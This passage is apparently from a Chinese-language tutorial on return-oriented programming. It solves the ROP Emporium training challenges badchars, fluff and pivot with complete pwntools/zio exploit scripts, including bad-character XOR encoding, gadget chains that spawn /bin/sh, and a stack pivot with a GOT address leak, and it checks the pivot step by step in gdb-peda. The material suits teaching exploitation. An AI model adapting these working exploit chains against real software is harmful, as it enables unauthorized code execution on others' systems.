0x08048899 : pop esi ; pop edi ; ret
0x08048890 : xor byte ptr [ebx], cl ; ret
```

整个利用过程就是写入前编码，使用前解码，下面是 payload：

```python
from zio import *

xor_ebx_cl  = 0x08048890
pop_ebx_ecx = 0x08048896
pop_esi_edi = 0x08048899
mov_edi_esi = 0x08048893

system_plt  = 0x080484e0
data_addr   = 0x0804a038

# encode
badchars    = [0x62, 0x69, 0x63, 0x2f, 0x20, 0x66, 0x6e, 0x73]
xor_byte    = 0x1
while(1):
    binsh = ""
    for i in "/bin/sh\x00":
        c = ord(i) ^ xor_byte
        if c in badchars:
            xor_byte += 1
            break
        else:
            binsh += chr(c)
    if len(binsh) == 8:
        break

# write
payload  = "A"*44
payload += l32(pop_esi_edi)
payload += binsh[:4]
payload += l32(data_addr)
payload += l32(mov_edi_esi)
payload += l32(pop_esi_edi)
payload += binsh[4:8]
payload += l32(data_addr + 4)
payload += l32(mov_edi_esi)

# decode
for i in range(len(binsh)):
    payload += l32(pop_ebx_ecx)
    payload += l32(data_addr + i)
    payload += l32(xor_byte)
    payload += l32(xor_ebx_cl)

# run
payload += l32(system_plt)
payload += "BBBB"
payload += l32(data_addr)

io = zio('./badchars32')
io.writeline(payload)
io.interact()
```

### badchars

64 位程序也是一样的，注意参数传递就好了。

```text
$ ropgadget --binary badchars --only "mov|pop|ret|xor"
...
0x0000000000400b34 : mov qword ptr [r13], r12 ; ret
0x0000000000400b3b : pop r12 ; pop r13 ; ret
0x0000000000400b40 : pop r14 ; pop r15 ; ret
0x0000000000400b30 : xor byte ptr [r15], r14b ; ret
0x0000000000400b39 : pop rdi ; ret
```

```python
from pwn import *

pop_r12_r13  = 0x0000000000400b3b
mov_r13_r12  = 0x0000000000400b34
pop_r14_r15  = 0x0000000000400b40
xor_r15_r14b = 0x0000000000400b30
pop_rdi      = 0x0000000000400b39

system_plt = 0x00000000004006f0
data_addr  = 0x0000000000601000

badchars = [0x62, 0x69, 0x63, 0x2f, 0x20, 0x66, 0x6e, 0x73]
xor_byte = 0x1
while(1):
    binsh = ""
    for i in "/bin/sh\x00":
        c = ord(i) ^ xor_byte
        if c in badchars:
            xor_byte += 1
            break
        else:
            binsh += chr(c)
    if len(binsh) == 8:
        break

payload  = "A"*40
payload += p64(pop_r12_r13)
payload += binsh
payload += p64(data_addr)
payload += p64(mov_r13_r12)

for i in range(len(binsh)):
    payload += p64(pop_r14_r15)
    payload += p64(xor_byte)
    payload += p64(data_addr + i)
    payload += p64(xor_r15_r14b)

payload += p64(pop_rdi)
payload += p64(data_addr)
payload += p64(system_plt)

io = process('./badchars')
io.recvuntil('>')
io.sendline(payload)
io.interactive()
```

### fluff32

这个练习与上面没有太大区别，难点在于我们能找到的 gadgets 不是那么直接，有一个技巧是因为我们的目的是写入字符串，那么必然需要 `mov [reg], reg` 这样的 gadgets，我们就从这里出发，倒推所需的 gadgets。

```text
$ ropgadget --binary fluff32 --only "mov|pop|ret|xor|xchg"
...
0x08048693 : mov dword ptr [ecx], edx ; pop ebp ; pop ebx ; xor byte ptr [ecx], bl ; ret
0x080483e1 : pop ebx ; ret
0x08048689 : xchg edx, ecx ; pop ebp ; mov edx, 0xdefaced0 ; ret
0x0804867b : xor edx, ebx ; pop ebp ; mov edi, 0xdeadbabe ; ret
0x08048671 : xor edx, edx ; pop esi ; mov ebp, 0xcafebabe ; ret
```

我们看到一个这样的 `mov dword ptr [ecx], edx ;`，可以想到我们将地址放进 `ecx`，将数据放进 `edx`，从而将数据写入到地址中。payload 如下：

```python
from zio import *

system_plt   = 0x08048430
data_addr    = 0x0804a028

pop_ebx      = 0x080483e1
mov_ecx_edx  = 0x08048693
xchg_edx_ecx = 0x08048689
xor_edx_ebx  = 0x0804867b
xor_edx_edx  = 0x08048671

def write_data(data, addr):
    # addr -> ecx
    payload  = l32(xor_edx_edx)
    payload += "BBBB"
    payload += l32(pop_ebx)
    payload += l32(addr)
    payload += l32(xor_edx_ebx)
    payload += "BBBB"
    payload += l32(xchg_edx_ecx)
    payload += "BBBB"

    # data -> edx
    payload += l32(xor_edx_edx)
    payload += "BBBB"
    payload += l32(pop_ebx)
    payload += data
    payload += l32(xor_edx_ebx)
    payload += "BBBB"

    # edx -> [ecx]
    payload += l32(mov_ecx_edx)
    payload += "BBBB"
    payload += l32(0)

    return payload

payload  = "A"*44

payload += write_data("/bin", data_addr)
payload += write_data("/sh\x00", data_addr + 4)

payload += l32(system_plt)
payload += "BBBB"
payload += l32(data_addr)

io = zio('./fluff32')
io.writeline(payload)
io.interact()
```

### fluff

提示：在使用 ropgadget 搜索时加上参数 `--depth` 可以得到更大长度的 gadgets。

```text
$ ropgadget --binary fluff --only "mov|pop|ret|xor|xchg" --depth 20
...
0x0000000000400832 : pop r12 ; mov r13d, 0x604060 ; ret
0x000000000040084c : pop r15 ; mov qword ptr [r10], r11 ; pop r13 ; pop r12 ; xor byte ptr [r10], r12b ; ret
0x0000000000400840 : xchg r11, r10 ; pop r15 ; mov r11d, 0x602050 ; ret
0x0000000000400822 : xor r11, r11 ; pop r14 ; mov edi, 0x601050 ; ret
0x000000000040082f : xor r11, r12 ; pop r12 ; mov r13d, 0x604060 ; ret
```

```python
from pwn import *

system_plt = 0x004005e0
data_addr  = 0x0000000000601050

xor_r11_r11 = 0x0000000000400822
xor_r11_r12 = 0x000000000040082f
xchg_r11_r10 = 0x0000000000400840
mov_r10_r11 = 0x000000000040084c
pop_r12 = 0x0000000000400832

def write_data(data, addr):
    # addr -> r10
    payload  = p64(xor_r11_r11)
    payload += "BBBBBBBB"
    payload += p64(pop_r12)
    payload += p64(addr)
    payload += p64(xor_r11_r12)
    payload += "BBBBBBBB"
    payload += p64(xchg_r11_r10)
    payload += "BBBBBBBB"

    # data -> r11
    payload += p64(xor_r11_r11)
    payload += "BBBBBBBB"
    payload += p64(pop_r12)
    payload += data
    payload += p64(xor_r11_r12)
    payload += "BBBBBBBB"

    # r11 -> [r10]
    payload += p64(mov_r10_r11)
    payload += "BBBBBBBB"*2
    payload += p64(0)

    return payload

payload  = "A"*40
payload += write_data("/bin/sh\x00", data_addr)
payload += p64(system_plt)

io = process('./fluff')
io.recvuntil('>')
io.sendline(payload)
io.interactive()
```

### pivot32

这是挑战的最后一题，难度突然增加。首先是动态库，动态库中函数的相对位置是固定的，所以如果我们知道其中一个函数的地址，就可以通过相对位置关系得到其他任意函数的地址。在开启 ASLR 的情况下，动态库加载到内存中的地址是变化的，但并不影响库中函数的相对位置，所以我们要想办法先泄露出某个函数的地址，从而得到目标函数地址。

通过分析我们知道该程序从动态库 `libpivot32.so` 中导入了函数 `foothold_function()`，但在程序逻辑中并没有调用，而在 `libpivot32.so` 中还有我们需要的函数 `ret2win()`。

现在我们知道了可以泄露的函数 `foothold_function()`，那么怎么泄露呢。前面我们已经简单介绍了延时绑定技术，当我们在调用如 `func@plt()` 的时候，系统才会将真正的 `func()` 函数地址写入到 GOT 表的 `func.got.plt` 中，然后 `func@plt()` 根据 `func.got.plt` 跳转到真正的 `func()` 函数上去。

最后是该挑战最重要的部分，程序运行我们有两次输入，第一次输入被放在一个由 `malloc()` 函数分配的堆上，当然为了降低难度，程序特地将该地址打印了出来，第二次的输入则被放在一个大小限制为 13 字节的栈上，这个空间不足以让我们执行很多东西，所以需要运用 stack pivot，即通过覆盖调用者的 ebp，将栈帧转移到另一个地方，同时控制 eip，即可改变程序的执行流，通常的 payload（这里称为副payload） 结构如下：

```text
buffer padding | fake ebp | leave;ret addr |
```

这样函数的返回地址就被覆盖为 leave;ret 指令的地址，这样程序在执行完其原本的 leave;ret 后，又执行了一次 leave;ret。

另外 fake ebp 指向我们另一段 payload（这里称为主payload） 的 ebp，即 主payload 地址减 4 的地方，当然你也可以在构造 主payload 时在前面加 4 个字节的 padding 作为 ebp：

```text
ebp | payload
```

我们知道一个函数的入口点通常是：

```text
push ebp
mov  ebp,esp
```

leave 指令相当于：

```text
mov esp,ebp
pop ebp
```

ret 指令为相当于：

```text
pop eip
```

如果遇到一种情况，我们可以控制的栈溢出的字节数比较小，不能完成全部的工作，同时程序开启了 PIE 或者系统开启了 ASLR，但同时在程序的另一个地方有足够的空间可以写入 payload，并且可执行，那么我们就将栈转移到那个地方去。

完整的 exp 如下：

```python
from pwn import *

#context.log_level = 'debug'
#context.terminal = ['konsole']
io = process('./pivot32')
elf = ELF('./pivot32')
libp = ELF('./libpivot32.so')

leave_ret = 0x0804889f

foothold_plt     = elf.plt['foothold_function'] # 0x080485f0
foothold_got_plt = elf.got['foothold_function'] # 0x0804a024

pop_eax      = 0x080488c0
pop_ebx      = 0x08048571
mov_eax_eax  = 0x080488c4
add_eax_ebx  = 0x080488c7
call_eax     = 0x080486a3

foothold_sym = libp.symbols['foothold_function']
ret2win_sym  = libp.symbols['ret2win']
offset = int(ret2win_sym - foothold_sym) # 0x1f7

leakaddr  = int(io.recv().split()[20], 16)

# calls foothold_function() to populate its GOT entry, then queries that value into EAX
#gdb.attach(io)
payload_1  = p32(foothold_plt)
payload_1 += p32(pop_eax)
payload_1 += p32(foothold_got_plt)
payload_1 += p32(mov_eax_eax)
payload_1 += p32(pop_ebx)
payload_1 += p32(offset)
payload_1 += p32(add_eax_ebx)
payload_1 += p32(call_eax)

io.sendline(payload_1)

# ebp = leakaddr-4, esp = leave_ret
payload_2  = "A"*40
payload_2 += p32(leakaddr-4) + p32(leave_ret)

io.sendline(payload_2)
print io.recvall()
```

这里我们在 gdb 中验证一下，在 pwnme() 函数的 leave 处下断点：

```text
gdb-peda$ b *0x0804889f
Breakpoint 1 at 0x804889f
gdb-peda$ c
Continuing.
[----------------------------------registers-----------------------------------]
EAX: 0xffe7ec40 ('A' <repeats 40 times>, "\f\317U\367\237\210\004\b\n")
EBX: 0x0
ECX: 0xffe7ec40 ('A' <repeats 40 times>, "\f\317U\367\237\210\004\b\n")
EDX: 0xf7731860 --> 0x0
ESI: 0xf772fe28 --> 0x1d1d30
EDI: 0x0
EBP: 0xffe7ec68 --> 0xf755cf0c --> 0x0
ESP: 0xffe7ec40 ('A' <repeats 40 times>, "\f\317U\367\237\210\004\b\n")
EIP: 0x804889f (<pwnme+173>:    leave)
EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x8048896 <pwnme+164>:       call   0x80485b0 <fgets@plt>
   0x804889b <pwnme+169>:       add    esp,0x10
   0x804889e <pwnme+172>:       nop
=> 0x804889f <pwnme+173>:       leave  
   0x80488a0 <pwnme+174>:       ret
   0x80488a1 <uselessFunction>: push   ebp
   0x80488a2 <uselessFunction+1>:       mov    ebp,esp
   0x80488a4 <uselessFunction+3>:       sub    esp,0x8
[------------------------------------stack-------------------------------------]
0000| 0xffe7ec40 ('A' <repeats 40 times>, "\f\317U\367\237\210\004\b\n")
0004| 0xffe7ec44 ('A' <repeats 36 times>, "\f\317U\367\237\210\004\b\n")
0008| 0xffe7ec48 ('A' <repeats 32 times>, "\f\317U\367\237\210\004\b\n")
0012| 0xffe7ec4c ('A' <repeats 28 times>, "\f\317U\367\237\210\004\b\n")
0016| 0xffe7ec50 ('A' <repeats 24 times>, "\f\317U\367\237\210\004\b\n")
0020| 0xffe7ec54 ('A' <repeats 20 times>, "\f\317U\367\237\210\004\b\n")
0024| 0xffe7ec58 ('A' <repeats 16 times>, "\f\317U\367\237\210\004\b\n")
0028| 0xffe7ec5c ('A' <repeats 12 times>, "\f\317U\367\237\210\004\b\n")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x0804889f in pwnme ()
gdb-peda$ x/10w 0xffe7ec68
0xffe7ec68:     0xf755cf0c      0x0804889f      0xf755000a      0x00000000
0xffe7ec78:     0x00000002      0x00000000      0x00000001      0xffe7ed44
0xffe7ec88:     0xf755cf10      0xf655d010
gdb-peda$ x/10w 0xf755cf0c
0xf755cf0c:     0x00000000      0x080485f0      0x080488c0      0x0804a024
0xf755cf1c:     0x080488c4      0x08048571      0x000001f7      0x080488c7
0xf755cf2c:     0x080486a3      0x0000000a
```

执行第一次 leave;ret 之前，我们看到 EBP 指向 fake ebp，即 `0xf755cf0c`，fake ebp 指向 主payload 的 ebp，而在 fake ebp 后面是 leave;ret 的地址 `0x0804889f`，即返回地址。

执行第一次 leave：

```text
gdb-peda$ n
[----------------------------------registers-----------------------------------]
EAX: 0xffe7ec40 ('A' <repeats 40 times>, "\f\317U\367\237\210\004\b\n")
EBX: 0x0
ECX: 0xffe7ec40 ('A' <repeats 40 times>, "\f\317U\367\237\210\004\b\n")
EDX: 0xf7731860 --> 0x0
ESI: 0xf772fe28 --> 0x1d1d30
EDI: 0x0
EBP: 0xf755cf0c --> 0x0
ESP: 0xffe7ec6c --> 0x804889f (<pwnme+173>:     leave)
EIP: 0x80488a0 (<pwnme+174>:    ret)
EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x804889b <pwnme+169>:       add    esp,0x10
   0x804889e <pwnme+172>:       nop
   0x804889f <pwnme+173>:       leave  
=> 0x80488a0 <pwnme+174>:       ret
   0x80488a1 <uselessFunction>: push   ebp
   0x80488a2 <uselessFunction+1>:       mov    ebp,esp
   0x80488a4 <uselessFunction+3>:       sub    esp,0x8
   0x80488a7 <uselessFunction+6>:       call   0x80485f0 <foothold_function@plt>
[------------------------------------stack-------------------------------------]
0000| 0xffe7ec6c --> 0x804889f (<pwnme+173>:    leave)
0004| 0xffe7ec70 --> 0xf755000a --> 0x0
0008| 0xffe7ec74 --> 0x0
0012| 0xffe7ec78 --> 0x2
0016| 0xffe7ec7c --> 0x0
0020| 0xffe7ec80 --> 0x1
0024| 0xffe7ec84 --> 0xffe7ed44 --> 0xffe808cf ("./pivot32")
0028| 0xffe7ec88 --> 0xf755cf10 --> 0x80485f0 (<foothold_function@plt>: jmp    DWORD PTR ds:0x804a024)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x080488a0 in pwnme ()
```

EBP 的值 `0xffe7ec68` 被赋值给 ESP，然后从栈中弹出 `0xf755cf0c`，即 fake ebp 并赋值给 EBP，同时 ESP+4=`0xffe7ec6c`，指向第二次的 leave。

执行第一次 ret：

```text
gdb-peda$ n
[----------------------------------registers-----------------------------------]
EAX: 0xffe7ec40 ('A' <repeats 40 times>, "\f\317U\367\237\210\004\b\n")
EBX: 0x0
ECX: 0xffe7ec40 ('A' <repeats 40 times>, "\f\317U\367\237\210\004\b\n")
EDX: 0xf7731860 --> 0x0
ESI: 0xf772fe28 --> 0x1d1d30
EDI: 0x0
EBP: 0xf755cf0c --> 0x0
ESP: 0xffe7ec70 --> 0xf755000a --> 0x0
EIP: 0x804889f (<pwnme+173>:    leave)
EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x8048896 <pwnme+164>:       call   0x80485b0 <fgets@plt>
   0x804889b <pwnme+169>:       add    esp,0x10
   0x804889e <pwnme+172>:       nop
=> 0x804889f <pwnme+173>:       leave  
   0x80488a0 <pwnme+174>:       ret
   0x80488a1 <uselessFunction>: push   ebp
   0x80488a2 <uselessFunction+1>:       mov    ebp,esp
   0x80488a4 <uselessFunction+3>:       sub    esp,0x8
[------------------------------------stack-------------------------------------]
0000| 0xffe7ec70 --> 0xf755000a --> 0x0
0004| 0xffe7ec74 --> 0x0
0008| 0xffe7ec78 --> 0x2
0012| 0xffe7ec7c --> 0x0
0016| 0xffe7ec80 --> 0x1
0020| 0xffe7ec84 --> 0xffe7ed44 --> 0xffe808cf ("./pivot32")
0024| 0xffe7ec88 --> 0xf755cf10 --> 0x80485f0 (<foothold_function@plt>: jmp    DWORD PTR ds:0x804a024)
0028| 0xffe7ec8c --> 0xf655d010 --> 0x0
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x0804889f in pwnme ()
```

EIP=`0x804889f`，同时 ESP+4。

第二次 leave：

```text
gdb-peda$ n
[----------------------------------registers-----------------------------------]
EAX: 0xffe7ec40 ('A' <repeats 40 times>, "\f\317U\367\237\210\004\b\n")
EBX: 0x0
ECX: 0xffe7ec40 ('A' <repeats 40 times>, "\f\317U\367\237\210\004\b\n")
EDX: 0xf7731860 --> 0x0
ESI: 0xf772fe28 --> 0x1d1d30
EDI: 0x0
EBP: 0x0
ESP: 0xf755cf10 --> 0x80485f0 (<foothold_function@plt>: jmp    DWORD PTR ds:0x804a024)
EIP: 0x80488a0 (<pwnme+174>:    ret)
EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x804889b <pwnme+169>:       add    esp,0x10
   0x804889e <pwnme+172>:       nop
   0x804889f <pwnme+173>:       leave  
=> 0x80488a0 <pwnme+174>:       ret
   0x80488a1 <uselessFunction>: push   ebp
   0x80488a2 <uselessFunction+1>:       mov    ebp,esp
   0x80488a4 <uselessFunction+3>:       sub    esp,0x8
   0x80488a7 <uselessFunction+6>:       call   0x80485f0 <foothold_function@plt>
[------------------------------------stack-------------------------------------]
0000| 0xf755cf10 --> 0x80485f0 (<foothold_function@plt>:        jmp    DWORD PTR ds:0x804a024)
0004| 0xf755cf14 --> 0x80488c0 (<usefulGadgets>:        pop    eax)
0008| 0xf755cf18 --> 0x804a024 --> 0x80485f6 (<foothold_function@plt+6>:        push   0x30)
0012| 0xf755cf1c --> 0x80488c4 (<usefulGadgets+4>:      mov    eax,DWORD PTR [eax])
0016| 0xf755cf20 --> 0x8048571 (<_init+33>:     pop    ebx)
0020| 0xf755cf24 --> 0x1f7
0024| 0xf755cf28 --> 0x80488c7 (<usefulGadgets+7>:      add    eax,ebx)
0028| 0xf755cf2c --> 0x80486a3 (<deregister_tm_clones+35>:      call   eax)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x080488a0 in pwnme ()
gdb-peda$ x/10w 0xf755cf10
0xf755cf10:     0x080485f0      0x080488c0      0x0804a024      0x080488c4
0xf755cf20:     0x08048571      0x000001f7      0x080488c7      0x080486a3
0xf755cf30:     0x0000000a      0x00000000
```

EBP 的值 `0xf755cf0c` 被赋值给 ESP，并将 主payload 的 ebp 赋值给 EBP，同时 ESP+4=`0xf755cf10`，这个值正是我们 主payload 的地址。

第二次 ret：

```text
gdb-peda$ n
[----------------------------------registers-----------------------------------]
EAX: 0xffe7ec40 ('A' <repeats 40 times>, "\f\317U\367\237\210\004\b\n")
EBX: 0x0
ECX: 0xffe7ec40 ('A' <repeats 40 times>, "\f\317U\367\237\210\004\b\n")
EDX: 0xf7731860 --> 0x0
ESI: 0xf772fe28 --> 0x1d1d30
EDI: 0x0
EBP: 0x0
ESP: 0xf755cf14 --> 0x80488c0 (<usefulGadgets>: pop    eax)
EIP: 0x80485f0 (<foothold_function@plt>:        jmp    DWORD PTR ds:0x804a024)
EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x80485e0 <exit@plt>:        jmp    DWORD PTR ds:0x804a020
   0x80485e6 <exit@plt+6>:      push   0x28
   0x80485eb <exit@plt+11>:     jmp    0x8048580
=> 0x80485f0 <foothold_function@plt>:   jmp    DWORD PTR ds:0x804a024
 | 0x80485f6 <foothold_function@plt+6>: push   0x30
 | 0x80485fb <foothold_function@plt+11>:        jmp    0x8048580
 | 0x8048600 <__libc_start_main@plt>:   jmp    DWORD PTR ds:0x804a028
 | 0x8048606 <__libc_start_main@plt+6>: push   0x38
 |->   0x80485f6 <foothold_function@plt+6>:     push   0x30
       0x80485fb <foothold_function@plt+11>:    jmp    0x8048580
       0x8048600 <__libc_start_main@plt>:       jmp    DWORD PTR ds:0x804a028
       0x8048606 <__libc_start_main@plt+6>:     push   0x38
                                                                  JUMP is taken
[------------------------------------stack-------------------------------------]
0000| 0xf755cf14 --> 0x80488c0 (<usefulGadgets>:        pop    eax)
0004| 0xf755cf18 --> 0x804a024 --> 0x80485f6 (<foothold_function@plt+6>:        push   0x30)
0008| 0xf755cf1c --> 0x80488c4 (<usefulGadgets+4>:      mov    eax,DWORD PTR [eax])
0012| 0xf755cf20 --> 0x8048571 (<_init+33>:     pop    ebx)
0016| 0xf755cf24 --> 0x1f7
0020| 0xf755cf28 --> 0x80488c7 (<usefulGadgets+7>:      add    eax,ebx)
0024| 0xf755cf2c --> 0x80486a3 (<deregister_tm_clones+35>:      call   eax)
0028| 0xf755cf30 --> 0xa ('\n')
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x080485f0 in foothold_function@plt ()
```

成功跳转到 `foothold_function@plt`，接下来系统通过 `_dl_runtime_resolve` 等步骤，将真正的地址写入到 `.got.plt` 中，我们构造 gadget 泄露出该地址地址，然后计算出 `ret2win()` 的地址，调用它，就成功了。

地址泄露的过程：

```text
gdb-peda$ n
[----------------------------------registers-----------------------------------]
EAX: 0x54 ('T')
EBX: 0x0
ECX: 0x54 ('T')
EDX: 0xf7731854 --> 0x0
ESI: 0xf772fe28 --> 0x1d1d30
EDI: 0x0
EBP: 0x0
ESP: 0xf755cf18 --> 0x804a024 --> 0xf7772770 (<foothold_function>:      push   ebp)
EIP: 0x80488c0 (<usefulGadgets>:        pop    eax)
EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x80488ba:   xchg   ax,ax
   0x80488bc:   xchg   ax,ax
   0x80488be:   xchg   ax,ax
=> 0x80488c0 <usefulGadgets>:   pop    eax
   0x80488c1 <usefulGadgets+1>: ret
   0x80488c2 <usefulGadgets+2>: xchg   esp,eax
   0x80488c3 <usefulGadgets+3>: ret
   0x80488c4 <usefulGadgets+4>: mov    eax,DWORD PTR [eax]
[------------------------------------stack-------------------------------------]
0000| 0xf755cf18 --> 0x804a024 --> 0xf7772770 (<foothold_function>:     push   ebp)
0004| 0xf755cf1c --> 0x80488c4 (<usefulGadgets+4>:      mov    eax,DWORD PTR [eax])
0008| 0xf755cf20 --> 0x8048571 (<_init+33>:     pop    ebx)
0012| 0xf755cf24 --> 0x1f7
0016| 0xf755cf28 --> 0x80488c7 (<usefulGadgets+7>:      add    eax,ebx)
0020| 0xf755cf2c --> 0x80486a3 (<deregister_tm_clones+35>:      call   eax)
0024| 0xf755cf30 --> 0xa ('\n')
0028| 0xf755cf34 --> 0x0
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x080488c0 in usefulGadgets ()
gdb-peda$ n
[----------------------------------registers-----------------------------------]
EAX: 0x804a024 --> 0xf7772770 (<foothold_function>:     push   ebp)
EBX: 0x0
ECX: 0x54 ('T')
EDX: 0xf7731854 --> 0x0
ESI: 0xf772fe28 --> 0x1d1d30
EDI: 0x0
EBP: 0x0
ESP: 0xf755cf1c --> 0x80488c4 (<usefulGadgets+4>:       mov    eax,DWORD PTR [eax])
EIP: 0x80488c1 (<usefulGadgets+1>:      ret)
EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x80488bc:   xchg   ax,ax
   0x80488be:   xchg   ax,ax
   0x80488c0 <usefulGadgets>:   pop    eax
=> 0x80488c1 <usefulGadgets+1>: ret
   0x80488c2 <usefulGadgets+2>: xchg   esp,eax
   0x80488c3 <usefulGadgets+3>: ret
   0x80488c4 <usefulGadgets+4>: mov    eax,DWORD PTR [eax]
   0x80488c6 <usefulGadgets+6>: ret
[------------------------------------stack-------------------------------------]
0000| 0xf755cf1c --> 0x80488c4 (<usefulGadgets+4>:      mov    eax,DWORD PTR [eax])
0004| 0xf755cf20 --> 0x8048571 (<_init+33>:     pop    ebx)
0008| 0xf755cf24 --> 0x1f7
0012| 0xf755cf28 --> 0x80488c7 (<usefulGadgets+7>:      add    eax,ebx)
0016| 0xf755cf2c --> 0x80486a3 (<deregister_tm_clones+35>:      call   eax)
0020| 0xf755cf30 --> 0xa ('\n')
0024| 0xf755cf34 --> 0x0
0028| 0xf755cf38 --> 0x0
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x080488c1 in usefulGadgets ()
gdb-peda$ n
[----------------------------------registers-----------------------------------]
EAX: 0x804a024 --> 0xf7772770 (<foothold_function>:     push   ebp)
EBX: 0x0
ECX: 0x54 ('T')
EDX: 0xf7731854 --> 0x0
ESI: 0xf772fe28 --> 0x1d1d30
EDI: 0x0
EBP: 0x0
ESP: 0xf755cf20 --> 0x8048571 (<_init+33>:      pop    ebx)
EIP: 0x80488c4 (<usefulGadgets+4>:      mov    eax,DWORD PTR [eax])
EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x80488c1 <usefulGadgets+1>: ret
   0x80488c2 <usefulGadgets+2>: xchg   esp,eax
   0x80488c3 <usefulGadgets+3>: ret
=> 0x80488c4 <usefulGadgets+4>: mov    eax,DWORD PTR [eax]
   0x80488c6 <usefulGadgets+6>: ret
   0x80488c7 <usefulGadgets+7>: add    eax,ebx
   0x80488c9 <usefulGadgets+9>: ret
   0x80488ca <usefulGadgets+10>:        xchg   ax,ax
[------------------------------------stack-------------------------------------]
0000| 0xf755cf20 --> 0x8048571 (<_init+33>:     pop    ebx)
0004| 0xf755cf24 --> 0x1f7
0008| 0xf755cf28 --> 0x80488c7 (<usefulGadgets+7>:      add    eax,ebx)
0012| 0xf755cf2c --> 0x80486a3 (<deregister_tm_clones+35>:      call   eax)
0016| 0xf755cf30 --> 0xa ('\n')
0020| 0xf755cf34 --> 0x0
0024| 0xf755cf38 --> 0x0
0028| 0xf755cf3c --> 0x0
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x080488c4 in usefulGadgets ()
gdb-peda$ n
[----------------------------------registers-----------------------------------]
EAX: 0xf7772770 (<foothold_function>:   push   ebp)
EBX: 0x0
ECX: 0x54 ('T')
EDX: 0xf7731854 --> 0x0
ESI: 0xf772fe28 --> 0x1d1d30
EDI: 0x0
EBP: 0x0
ESP: 0xf755cf20 --> 0x8048571 (<_init+33>:      pop    ebx)
EIP: 0x80488c6 (<usefulGadgets+6>:      ret)
EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x80488c2 <usefulGadgets+2>: xchg   esp,eax
   0x80488c3 <usefulGadgets+3>: ret
   0x80488c4 <usefulGadgets+4>: mov    eax,DWORD PTR [eax]
=> 0x80488c6 <usefulGadgets+6>: ret
   0x80488c7 <usefulGadgets+7>: add    eax,ebx
   0x80488c9 <usefulGadgets+9>: ret
   0x80488ca <usefulGadgets+10>:        xchg   ax,ax
   0x80488cc <usefulGadgets+12>:        xchg   ax,ax
[------------------------------------stack-------------------------------------]
0000| 0xf755cf20 --> 0x8048571 (<_init+33>:     pop    ebx)
0004| 0xf755cf24 --> 0x1f7
0008| 0xf755cf28 --> 0x80488c7 (<usefulGadgets+7>:      add    eax,ebx)
0012| 0xf755cf2c --> 0x80486a3 (<deregister_tm_clones+35>:      call   eax)
0016| 0xf755cf30 --> 0xa ('\n')
0020| 0xf755cf34 --> 0x0
0024| 0xf755cf38 --> 0x0
0028| 0xf755cf3c --> 0x0
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x080488c6 in usefulGadgets ()
```

### pivot

基本同上，但你可以尝试把修改 rsp 的部分也用 gadgets 来实现，这样做的好处是我们不需要伪造一个堆栈，即不用管 ebp 的地址。如：

```python
payload_2  = "A" * 40
payload_2 += p64(pop_rax)
payload_2 += p64(leakaddr)
payload_2 += p64(xchg_rax_rsp)
```

实际上，我本人正是使用这种方法，因为我在构建 payload 时，`0x0000000000400ae0 <+165>:   leave`，leave;ret 的地址存在截断字符 `0a`，这样就不能通过正常的方式写入缓冲区，当然这也是可以解决的，比如先将 `0a` 换成非截断字符，之后再使用寄存器将 `0a` 写入该地址，这也是通常解决缓冲区中截断字符的方法，但是这样做难度太大，不推荐，感兴趣的读者可以尝试一下。

```text
$ ropgadget --binary pivot --only "mov|pop|call|add|xchg|ret"
0x0000000000400b09 : add rax, rbp ; ret
0x000000000040098e : call rax
0x0000000000400b05 : mov rax, qword ptr [rax] ; ret
0x0000000000400b00 : pop rax ; ret
0x0000000000400900 : pop rbp ; ret
0x0000000000400b02 : xchg rax, rsp ; ret
```

```python
from pwn import *

#context.log_level = 'debug'
#context.terminal = ['konsole']
io = process('./pivot')
elf = ELF('./pivot')
libp = ELF('./libpivot.so')

leave_ret = 0x0000000000400adf

foothold_plt     = elf.plt['foothold_function'] # 0x400850
foothold_got_plt = elf.got['foothold_function'] # 0x602048

pop_rax      = 0x0000000000400b00
pop_rbp      = 0x0000000000400900
mov_rax_rax  = 0x0000000000400b05
xchg_rax_rsp = 0x0000000000400b02
add_rax_rbp  = 0x0000000000400b09
call_rax     = 0x000000000040098e

foothold_sym = libp.symbols['foothold_function']
ret2win_sym  = libp.symbols['ret2win']
offset = int(ret2win_sym - foothold_sym) # 0x14e

leakaddr  = int(io.recv().split()[20], 16)

# calls foothold_function() to populate its GOT entry, then queries that value into EAX
#gdb.attach(io)
payload_1  = p64(foothold_plt)
payload_1 += p64(pop_rax)
payload_1 += p64(foothold_got_plt)
payload_1 += p64(mov_rax_rax)
payload_1 += p64(pop_rbp)
payload_1 += p64(offset)
payload_1 += p64(add_rax_rbp)
payload_1 += p64(call_rax)

io.sendline(payload_1)

# rsp = leakaddr
payload_2  = "A" * 40
payload_2 += p64(pop_rax)
payload_2 += p64(leakaddr)
payload_2 += p64(xchg_rax_rsp)

io.sendline(payload_2)
print io.recvall()
```

这样基本的 ROP 也就介绍完了，更高级的用法会在后面的章节中再介绍，所谓的高级，也就是 gadgets 构造更加巧妙，运用操作系统的知识更加底层而已。

